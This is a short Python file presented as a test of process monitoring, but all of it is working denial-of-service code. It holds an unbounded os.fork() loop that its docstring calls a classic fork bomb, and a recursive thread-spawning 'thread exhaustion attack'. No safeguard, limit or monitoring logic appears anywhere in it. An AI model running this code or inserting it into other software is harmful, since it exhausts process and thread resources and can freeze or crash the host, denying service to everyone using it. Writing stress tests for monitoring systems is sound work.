# fork_bomb_test.py - Tests process monitoring
import os
import sys
import time
import threading
from multiprocessing import Process

def exponential_process_spawn():
    """Creates exponential process growth - classic fork bomb pattern"""
    try:
        while True:
            if os.fork() == 0:  # Child process
                os.fork()  # Create another child
                time.sleep(0.001)
            time.sleep(0.001)
    except OSError:
        pass  # Handle resource exhaustion

def threading_bomb():
    """Thread exhaustion attack"""
    def recursive_thread():
        try:
            threading.Thread(target=recursive_thread).start()
            threading.Thread(target=recursive_thread).start()
        except:
            pass
    
    for _ in range(10):
        threading.Thread(target=recursive_thread).start()
